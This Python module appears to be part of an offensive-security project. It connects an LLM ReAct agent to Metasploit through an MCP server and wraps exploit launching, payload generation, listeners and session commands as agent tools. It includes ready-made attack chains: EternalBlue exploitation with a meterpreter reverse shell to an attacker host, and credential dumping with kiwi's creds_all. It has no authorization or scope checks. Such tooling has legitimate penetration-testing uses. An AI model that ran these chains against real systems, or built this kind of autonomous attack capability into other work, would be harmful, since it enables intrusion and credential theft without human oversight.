"""
╔═══════════════════════════════════════════════════════════════╗
║          ERR0RS-Ultimate :: MetasploitMCP Bridge              ║
║          Kali 2026.1 — Official MetasploitMCP Integration     ║
║                                                               ║
║  Architecture:                                                ║
║    ERR0RS Agent → msf_bridge.py → MetasploitMCP (HTTP/SSE)   ║
║                → msfrpcd (RPC) → Metasploit Framework         ║
║                                                               ║
║  Zero data exfil — 100% local airgapped operation            ║
║  Author: Gary Holden Schneider (Eros) | GitHub: Gnosisone     ║
╚═══════════════════════════════════════════════════════════════╝
"""

import asyncio
import httpx
import subprocess
import time
import os
import json
import logging
from typing import Optional
from dataclasses import dataclass

logger = logging.getLogger("ERR0RS.MSFBridge")

# ─────────────────────────────────────────
#  Config
# ─────────────────────────────────────────
MSF_MCP_HOST  = os.getenv("MSF_MCP_HOST",  "127.0.0.1")
MSF_MCP_PORT  = int(os.getenv("MSF_MCP_PORT", "8085"))
MSF_PASSWORD  = os.getenv("MSF_PASSWORD",  "err0rs_local")
MSF_RPC_HOST  = os.getenv("MSF_RPC_HOST",  "127.0.0.1")
MSF_RPC_PORT  = int(os.getenv("MSF_RPC_PORT", "55553"))
PAYLOAD_DIR   = os.getenv("PAYLOAD_SAVE_DIR", os.path.expanduser("~/err0rs_payloads"))
MSF_MCP_BASE  = f"http://{MSF_MCP_HOST}:{MSF_MCP_PORT}"

os.makedirs(PAYLOAD_DIR, exist_ok=True)


@dataclass
class MSFResult:
    """Structured result from any MSF MCP operation"""
    success: bool
    tool: str
    data: dict
    raw: str = ""
    error: str = ""

    def to_agent_context(self) -> str:
        """Format for Ollama ReAct agent context window injection"""
        if not self.success:
            return f"[MSF ERROR] {self.tool}: {self.error}"
        lines = [f"[MSF RESULT] {self.tool}"]
        lines.append(json.dumps(self.data, indent=2)[:4000])
        return "\n".join(lines)


class MetasploitBridge:
    """
    Full bridge between ERR0RS ReAct agent and MetasploitMCP.
    Handles lifecycle management of msfrpcd + MCP server,
    and exposes all MSF tools as clean async Python methods.

    Usage in agent loop:
        msf = get_msf_bridge()
        await msf.ensure_running()
        result = await msf.run_exploit(
            "exploit/windows/smb/ms17_010_eternalblue",
            {"RHOSTS": "192.168.1.100"},
            "windows/x64/meterpreter/reverse_tcp",
            {"LHOST": "192.168.1.10", "LPORT": 4444}
        )
        agent_context = result.to_agent_context()
    """

    def __init__(self):
        self._mcp_proc: Optional[subprocess.Popen] = None
        self._rpc_proc: Optional[subprocess.Popen] = None
        self._client = httpx.AsyncClient(timeout=120.0)

    # ── Lifecycle ──────────────────────────────────────────────
    async def ensure_running(self) -> bool:
        if not await self._check_mcp_alive():
            logger.info("[MSF] Starting msfrpcd...")
            self._start_msfrpcd()
            await asyncio.sleep(5)
            logger.info("[MSF] Starting MetasploitMCP server...")
            self._start_mcp_server()
            await asyncio.sleep(3)
        ready = await self._check_mcp_alive()
        if ready:
            logger.info(f"[MSF] MetasploitMCP ready at {MSF_MCP_BASE}")
        else:
            logger.error("[MSF] MetasploitMCP failed to start!")
        return ready

    def _start_msfrpcd(self):
        self._rpc_proc = subprocess.Popen(
            ["msfrpcd", "-P", MSF_PASSWORD, "-S",
             "-a", MSF_RPC_HOST, "-p", str(MSF_RPC_PORT)],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

    def _start_mcp_server(self):
        env = {**os.environ,
               "MSF_PASSWORD": MSF_PASSWORD,
               "MSF_SERVER":   MSF_RPC_HOST,
               "MSF_PORT":     str(MSF_RPC_PORT),
               "MSF_SSL":      "false",
               "PAYLOAD_SAVE_DIR": PAYLOAD_DIR}
        mcp_script = "/usr/share/MetasploitMCP/MetasploitMCP.py"
        self._mcp_proc = subprocess.Popen(
            ["python", mcp_script, "--transport", "http",
             "--host", MSF_MCP_HOST, "--port", str(MSF_MCP_PORT)],
            env=env,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

    async def _check_mcp_alive(self) -> bool:
        try:
            r = await self._client.get(f"{MSF_MCP_BASE}/health", timeout=3.0)
            return r.status_code == 200
        except Exception:
            return False

    async def shutdown(self):
        await self._client.aclose()
        for proc in (self._mcp_proc, self._rpc_proc):
            if proc:
                proc.terminate()

    # ── Core Tool Caller ───────────────────────────────────────
    async def _call(self, tool: str, params: dict) -> MSFResult:
        try:
            resp = await self._client.post(
                f"{MSF_MCP_BASE}/tools/{tool}", json=params)
            resp.raise_for_status()
            data = resp.json()
            return MSFResult(success=True, tool=tool, data=data, raw=str(data))
        except httpx.HTTPStatusError as e:
            return MSFResult(success=False, tool=tool, data={},
                             error=f"HTTP {e.response.status_code}: {e.response.text}")
        except Exception as e:
            return MSFResult(success=False, tool=tool, data={}, error=str(e))

    # ── Exploit & Module Operations ────────────────────────────
    async def list_exploits(self, query: str = "") -> MSFResult:
        return await self._call("list_exploits", {"query": query})

    async def list_payloads(self, platform: str = "", arch: str = "") -> MSFResult:
        return await self._call("list_payloads", {"platform": platform, "arch": arch})

    async def run_exploit(self, module: str, options: dict, payload: str,
                          payload_options: Optional[dict] = None,
                          run_check_first: bool = True) -> MSFResult:
        logger.info(f"[MSF] Running: {module} → {options.get('RHOSTS','?')}")
        return await self._call("run_exploit", {
            "module": module, "options": options, "payload": payload,
            "payload_options": payload_options or {},
            "run_check_first": run_check_first
        })

    async def run_auxiliary(self, module: str, options: dict) -> MSFResult:
        return await self._call("run_auxiliary_module", {"module": module, "options": options})

    async def run_post(self, module: str, session_id: int, options: dict = {}) -> MSFResult:
        return await self._call("run_post_module", {
            "module": module, "session_id": session_id, "options": options})

    # ── Session Management ─────────────────────────────────────
    async def list_sessions(self) -> MSFResult:
        return await self._call("list_active_sessions", {})

    async def session_cmd(self, session_id: int, command: str) -> MSFResult:
        logger.info(f"[MSF] Session {session_id}: {command}")
        return await self._call("send_session_command",
                                {"session_id": session_id, "command": command})

    async def terminate_session(self, session_id: int) -> MSFResult:
        return await self._call("terminate_session", {"session_id": session_id})

    # ── Listeners ──────────────────────────────────────────────
    async def list_listeners(self) -> MSFResult:
        return await self._call("list_listeners", {})

    async def start_listener(self, payload: str, lhost: str,
                             lport: int, extra_options: dict = {}) -> MSFResult:
        options = {"LHOST": lhost, "LPORT": lport, **extra_options}
        logger.info(f"[MSF] Listener: {payload} on {lhost}:{lport}")
        return await self._call("start_listener", {"payload": payload, "options": options})

    async def stop_job(self, job_id: int) -> MSFResult:
        return await self._call("stop_job", {"job_id": job_id})

    # ── Payload Generation ─────────────────────────────────────
    async def generate_payload(self, payload: str, fmt: str, lhost: str,
                               lport: int, extra_options: dict = {}) -> MSFResult:
        options = {"LHOST": lhost, "LPORT": lport, **extra_options}
        logger.info(f"[MSF] Generating {payload} as {fmt}")
        return await self._call("generate_payload",
                                {"payload": payload, "format": fmt, "options": options})

    # ── Pre-Built Attack Chains ────────────────────────────────
    async def eternalblue_chain(self, target: str, lhost: str, lport: int = 4444) -> dict:
        """Full EternalBlue: listener → exploit → grab session"""
        results = {}
        results["listener"] = await self.start_listener(
            "windows/x64/meterpreter/reverse_tcp", lhost, lport)
        results["exploit"] = await self.run_exploit(
            "exploit/windows/smb/ms17_010_eternalblue",
            {"RHOSTS": target},
            "windows/x64/meterpreter/reverse_tcp",
            {"LHOST": lhost, "LPORT": lport},
            run_check_first=True)
        await asyncio.sleep(3)
        results["sessions"] = await self.list_sessions()
        return results

    async def quick_scan_smb(self, subnet: str) -> MSFResult:
        return await self.run_auxiliary(
            "auxiliary/scanner/smb/smb_ms17_010",
            {"RHOSTS": subnet, "THREADS": "20"})

    async def dump_creds_from_session(self, session_id: int) -> dict:
        results = {}
        results["suggester"] = await self.run_post(
            "post/multi/recon/local_exploit_suggester", session_id)
        results["kiwi_load"] = await self.session_cmd(session_id, "load kiwi")
        results["kiwi_dump"] = await self.session_cmd(session_id, "creds_all")
        return results


# ── Singleton ──────────────────────────────────────────────────
_bridge_instance: Optional[MetasploitBridge] = None

def get_msf_bridge() -> MetasploitBridge:
    global _bridge_instance
    if _bridge_instance is None:
        _bridge_instance = MetasploitBridge()
    return _bridge_instance
